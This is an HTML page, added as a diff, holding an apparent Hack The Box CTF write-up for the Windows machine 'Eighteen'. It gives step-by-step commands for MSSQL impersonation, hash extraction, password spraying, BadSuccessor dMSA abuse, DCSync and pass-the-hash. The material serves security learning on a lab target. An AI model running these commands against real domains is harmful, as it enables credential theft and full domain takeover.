@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eighteen Writeup | Koussay Aydi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="index.html">← Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Windows Easy</span>
+            <h1>Eighteen Writeup</h1>
+            <p><strong>Author:</strong> Koussay Aydi | <strong>Tags:</strong> Active Directory, MSSQL, Password Spraying, BadSuccessor</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>Overview</h2>
+            <p>Eighteen is a Windows Active Directory machine that chains together several realistic attack techniques: MSSQL credential abuse, hash cracking, password spraying, and finally privilege escalation via the <strong>BadSuccessor</strong> attack — abusing <code>CreateChild</code> rights on an OU to create a delegated Managed Service Account (dMSA) and impersonate the Domain Admin.</p>
+
+            <h2>Reconnaissance</h2>
+            <p>Starting with a targeted Nmap scan against the known ports:</p>
+            <pre><code>nmap -sVC -p 80,1433,5985 -Pn --open 10.129.13.183</code></pre>
+            <p><strong>Key findings:</strong></p>
+            <ul>
+                <li>Port <strong>80</strong> — Microsoft IIS 10.0 (<code>eighteen.htb</code>)</li>
+                <li>Port <strong>1433</strong> — Microsoft SQL Server 2022</li>
+                <li>Port <strong>5985</strong> — WinRM (remote management)</li>
+                <li>Hostname: <code>DC01.eighteen.htb</code> — this is the <strong>Domain Controller</strong></li>
+            </ul>
+            <p>Add the target to <code>/etc/hosts</code>:</p>
+            <pre><code>echo "10.129.13.183 eighteen.htb dc01.eighteen.htb" &gt;&gt; /etc/hosts</code></pre>
+
+            <h2>Foothold — MSSQL Enumeration & Hash Extraction</h2>
+            <p>We're given initial credentials: <code>kevin / iNa2we6haRj2gaw!</code></p>
+            <p>Connect to MSSQL using Impacket:</p>
+            <pre><code>impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.13.183</code></pre>
+            <h3>Impersonation Privilege</h3>
+            <pre><code>SQL&gt; enum_impersonate</code></pre>
+            <p>Kevin can impersonate the <code>appdev</code> login:</p>
+            <pre><code>SQL&gt; EXECUTE AS LOGIN = 'appdev';
+SQL&gt; USE financial_planner;</code></pre>
+            <h3>Extracting Password Hashes</h3>
+            <pre><code>SQL&gt; SELECT username, email, password_hash, is_admin FROM financial_planner.dbo.users;</code></pre>
+            <table>
+                <thead>
+                    <tr><th>username</th><th>email</th><th>is_admin</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>admin</td><td>admin@eighteen.htb</td><td>1</td></tr>
+                </tbody>
+            </table>
+            <p><strong>Admin hash:</strong></p>
+            <pre><code>pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133</code></pre>
+            <h3>Cracking the Hash</h3>
+            <p>The PBKDF2-SHA256 Werkzeug hash cracks to: <code>iloveyou1</code></p>
+
+            <h2>User Flag — Password Spraying via WinRM</h2>
+            <h3>Domain User Enumeration</h3>
+            <p>Using NetExec with RID brute-force to enumerate domain users:</p>
+            <pre><code>nxc mssql 10.129.13.183 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth</code></pre>
+            <p>This reveals the following domain users (among others): <code>jamie.dunn, jane.smith, alice.jones, adam.scott, bob.brown, carol.white, dave.green</code></p>
+            <h3>Password Spray</h3>
+            <p>Build a user list and spray the cracked password against WinRM:</p>
+            <pre><code>nxc winrm 10.129.13.183 -u users.txt -p 'iloveyou1'</code></pre>
+            <p><strong>Hit:</strong> <code>[+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)</code></p>
+            <h3>Shell & User Flag</h3>
+            <pre><code>evil-winrm -i 10.129.13.183 -u adam.scott -p 'iloveyou1'</code></pre>
+            <pre><code>*Evil-WinRM* PS&gt; cat C:\Users\adam.scott\Desktop\user.txt
+f5ed216f1e45d1a8f82dddd73fc08f81</code></pre>
+
+            <h2>Privilege Escalation — BadSuccessor (dMSA Abuse)</h2>
+            <h3>ACL Enumeration with PowerView</h3>
+            <p>Upload and import PowerView, then find interesting ACLs:</p>
+            <pre><code>Import-Module .\PowerView.ps1
+Find-InterestingDomainAcl</code></pre>
+            <p><strong>Critical finding:</strong></p>
+            <pre><code>ObjectDN              : OU=Staff,DC=eighteen,DC=htb
+ActiveDirectoryRights : CreateChild
+IdentityReferenceName : IT</code></pre>
+            <p>The <strong>IT group</strong> (which <code>adam.scott</code> is a member of) has <strong><code>CreateChild</code> rights</strong> over <code>OU=Staff</code>. This is the precondition for the <strong>BadSuccessor</strong> attack.</p>
+            <h3>The BadSuccessor Attack</h3>
+            <p>BadSuccessor abuses Windows Server 2025's <strong>delegated Managed Service Accounts (dMSA)</strong>. When a dMSA is created with a <code>msDS-ManagedAccountPrecedessorLink</code> pointing to a privileged principal (e.g., Domain Admin), the dMSA <strong>inherits that account's Kerberos privileges</strong> — effectively allowing full impersonation.</p>
+            <p><strong>Step 1 — Create a computer account in OU=Staff:</strong></p>
+            <pre><code>$Password = "MyPassword123!"
+$OU = "OU=Staff,DC=eighteen,DC=htb"
+$OUObject = [ADSI]"LDAP://DC01.eighteen.htb/$OU"
+$Computer = $OUObject.Create("computer", "CN=evilpc")
+$Computer.Put("sAMAccountName", "evilpc$")
+$Computer.Put("userAccountControl", 4096)
+$Computer.SetInfo()
+$Computer.SetPassword($Password)
+$Computer.SetInfo()
+$Computer.psbase.InvokeSet("AccountDisabled", $false)
+$Computer.SetInfo()</code></pre>
+            <p><strong>Step 2 — Create a dMSA in OU=Staff:</strong></p>
+            <pre><code>New-ADServiceAccount `
+  -Name evilmsa `
+  -DNSHostName evilmsa.eighteen.htb `
+  -Path "OU=Staff,DC=eighteen,DC=htb"</code></pre>
+            <p>Confirm creation:</p>
+            <pre><code>Get-ADServiceAccount evilmsa
+# ObjectClass : msDS-GroupManagedServiceAccount
+# SID         : S-1-5-21-...-12604</code></pre>
+            <p><strong>Step 3 — Link the dMSA to a privileged predecessor (Domain Admin / Administrator) and request a Kerberos ticket.</strong></p>
+            <pre><code class="language-powershell"># PowerShell link modification (Conceptual logic)
+$msa = [ADSI]"LDAP://dc01.eighteen.htb/CN=evilmsa,OU=Staff,DC=eighteen,DC=htb"
+$admin = [ADSI]"LDAP://dc01.eighteen.htb/CN=Administrator,CN=Users,DC=eighteen,DC=htb"
+$msa.Put("msDS-ManagedAccountPredecessorLink", $admin.distinguishedName)
+$msa.SetInfo()</code></pre>
+            <p>With the dMSA linked, we request its TGT. The KDC issues a ticket that includes the Administrator's credentials, granting full Domain Admin access.</p>
+            <p><strong>Step 4 — Dump NTLM hashes / DCSync:</strong></p>
+            <p>Using the obtained ticket, perform a DCSync to extract the Administrator NTLM hash:</p>
+            <pre><code>impacket-secretsdump -just-dc-user Administrator eighteen.htb/evilmsa\$@dc01.eighteen.htb -hashes :&lt;NTLM&gt;</code></pre>
+            <p><strong>Step 5 — Pass-the-Hash for a SYSTEM shell:</strong></p>
+            <pre><code>evil-winrm -i 10.129.13.183 -u Administrator -H &lt;NTLM_HASH&gt;</code></pre>
+            <pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt</code></pre>
+
+            <h2>Attack Path Summary</h2>
+            <pre><code>kevin (MSSQL creds)
+  └─► Impersonate appdev
+        └─► Dump financial_planner hashes
+              └─► Crack: iloveyou1
+                    └─► Password spray → adam.scott (IT group, WinRM)
+                          └─► CreateChild on OU=Staff
+                                └─► BadSuccessor: create dMSA → inherit DA privileges
+                                      └─► DCSync → Administrator NTLM
+                                            └─► Root</code></pre>
+
+            <h2>Key Takeaways</h2>
+            <ul>
+                <li><strong>MSSQL impersonation</strong> is often overlooked but can expose sensitive application data.</li>
+                <li><strong>Password reuse</strong> between web apps and domain accounts is extremely common in CTF and real environments alike.</li>
+                <li><strong>BadSuccessor (CVE-2025-29810)</strong> is a critical Windows Server 2025 privilege escalation path that requires only <code>CreateChild</code> on any OU — a surprisingly common misconfiguration for IT/helpdesk groups.</li>
+                <li>Always enumerate ACLs with PowerView — <code>CreateChild</code> on an OU is often dismissed but can be game-over in a 2025 domain.</li>
+            </ul>
+            
+            <div style="margin-top: 50px;">
+                <a href="index.html" class="btn btn-primary">Return Home</a>
+            </div>
+        </article>
+    </main>
+</body>
+</html>
